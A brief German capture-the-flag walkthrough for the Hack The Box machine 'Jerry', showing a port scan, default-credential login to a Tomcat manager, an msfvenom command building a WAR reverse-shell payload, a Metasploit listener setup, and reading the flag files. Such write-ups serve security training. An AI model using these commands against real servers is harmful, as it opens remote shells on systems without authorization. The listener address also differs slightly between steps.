# 	Jerry

 Ein kurzes Tutorial für die Maschine "Jerry" von hackthebox.eu

 https://www.hackthebox.eu/home/machines/profile/144

## Anleitung

1.	Portscan mit ZenMap


	Offener Port auf 10.10.10.95:8080

	Apache 7.0.88 Server -> Schwachstelle 

	Vulnerabilitys:

	CVE-2017-12617 (1 Metasploit Module)

2.	Weboberfläche Analysieren


	401 Unauthorized Page liefert default passwort und username für manager/html

	Dort kann ein eine war datei auf dem server hochgeladen werden. Eine .war datei
	steht für Web Application Archive und beschreibt wie eine vollständige Webanwendung in eine Datei im 
	JAR bzw. ZIP Format verpackt wird.

3.	Infizieren der .war datei mit msfvenom


	Mit "msfvenom -l" zeigt Payloads an. Alternativ:
	https://netsec.ws/?p=331 

	msfvenom -p java/shell_reverse_tcp LHOST=10.10.15.199 LPORT=4444 -f war > shell.war

4. 	Shell Hochladen

	Mit Deploy shell Auf webserver hochladen.

5.	Metasploit shell listener erstellen


	Metasploit starten

	 > use multi/handler
	 > set payload java/shell_reverse_tcp
	 > show options
	 > set LHOST=10.10.15.119
	 > set LPORT=4444
	 > run

6.	Shell auf Webserver aufrufen

	Aufruf der Shell baut verbindung mit dem listener auf.

7.	Dateisystem nach code untersuchen

	Code ist auf Desktop/flags hinterlegt.

	- Mit dir /p oder auch nur dir wird in verzechnis angezeigt.
	- cd wechselt verzeichnis
	- type "2 for the price of 1.txt" öffnet text datei.


